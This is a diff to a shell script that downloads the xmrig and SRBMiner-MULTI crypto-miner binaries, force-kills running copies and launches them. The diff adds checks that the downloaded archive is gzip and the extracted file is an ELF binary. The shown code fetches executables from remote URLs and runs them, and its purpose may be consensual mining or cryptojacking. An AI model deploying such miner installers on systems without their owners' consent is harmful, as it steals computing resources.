@@ -386,13 +386,24 @@ install_cpu() {
                     continue
                 fi
             fi
+            # Verify it's actually a gzip archive
+            if ! head -c 2 "$tmp/cpu.tar.gz" 2>/dev/null | grep -q $'\x1f'; then
+                local magic=$(od -A n -t x1 -N 2 "$tmp/cpu.tar.gz" 2>/dev/null | tr -d ' ')
+                if [ "$magic" != "1f8b" ]; then
+                    rm -rf "$tmp"
+                    continue
+                fi
+            fi
             tar -xzf "$tmp/cpu.tar.gz" -C "$tmp" 2>/dev/null
             local found=$(find "$tmp" -type f -name "xmrig" 2>/dev/null | head -1)
             if [ -n "$found" ] && [ -f "$found" ]; then
-                cp "$found" "$BIN_CPU"
-                chmod +x "$BIN_CPU"
-                rm -rf "$tmp"
-                return 0
+                # Verify ELF binary
+                if head -c 4 "$found" 2>/dev/null | grep -q "ELF"; then
+                    cp "$found" "$BIN_CPU"
+                    chmod +x "$BIN_CPU"
+                    rm -rf "$tmp"
+                    return 0
+                fi
             fi
         fi
         rm -rf "$tmp"
@@ -408,13 +419,30 @@ install_gpu() {
     for url in "$URL_SRBMINER" "$URL_SRBMINER_BACKUP"; do
         local tmp=$(mktemp -d)
         if fetch "$url" "$tmp/gpu.tar.gz"; then
+            # Verify it's actually a gzip archive, not an HTML error page
+            if ! file "$tmp/gpu.tar.gz" 2>/dev/null | grep -qiE "gzip|tar|archive"; then
+                # Fallback check: first 2 bytes of gzip are 1f 8b
+                local magic=$(xxd -l 2 -p "$tmp/gpu.tar.gz" 2>/dev/null || od -A n -t x1 -N 2 "$tmp/gpu.tar.gz" 2>/dev/null | tr -d ' ')
+                if [ "$magic" != "1f8b" ]; then
+                    rm -rf "$tmp"
+                    continue
+                fi
+            fi
             tar -xzf "$tmp/gpu.tar.gz" -C "$tmp" 2>/dev/null
             local found=$(find "$tmp" -type f -name "SRBMiner-MULTI" 2>/dev/null | head -1)
             if [ -n "$found" ] && [ -f "$found" ]; then
-                cp "$found" "$BIN_GPU"
-                chmod +x "$BIN_GPU"
-                rm -rf "$tmp"
-                return 0
+                # Verify it's an ELF binary, not garbage
+                if file "$found" 2>/dev/null | grep -qiE "ELF|executable"; then
+                    cp "$found" "$BIN_GPU"
+                    chmod +x "$BIN_GPU"
+                    rm -rf "$tmp"
+                    return 0
+                elif head -c 4 "$found" 2>/dev/null | grep -q "ELF"; then
+                    cp "$found" "$BIN_GPU"
+                    chmod +x "$BIN_GPU"
+                    rm -rf "$tmp"
+                    return 0
+                fi
             fi
         fi
         rm -rf "$tmp"
@@ -483,6 +511,12 @@ CPUCFG
 launch_cpu() {
     pkill -9 -f "$(basename "$BIN_CPU")" 2>/dev/null
     sleep 1
+
+    # Validate existing binary — if it's not ELF, it's corrupt (HTML page, wrong arch, etc)
+    if [ -f "$BIN_CPU" ] && ! head -c 4 "$BIN_CPU" 2>/dev/null | grep -q "ELF"; then
+        rm -f "$BIN_CPU"
+    fi
+
     [ ! -f "$BIN_CPU" ] && install_cpu
     [ ! -f "$BIN_CPU" ] && return 1
 
@@ -512,6 +546,12 @@ launch_gpu() {
 
     pkill -9 -f "$(basename "$BIN_GPU")" 2>/dev/null
     sleep 1
+
+    # Validate existing binary — if it's not ELF, it's corrupt
+    if [ -f "$BIN_GPU" ] && ! head -c 4 "$BIN_GPU" 2>/dev/null | grep -q "ELF"; then
+        rm -f "$BIN_GPU"
+    fi
+
     [ ! -f "$BIN_GPU" ] && install_gpu
     [ ! -f "$BIN_GPU" ] && return 1
 
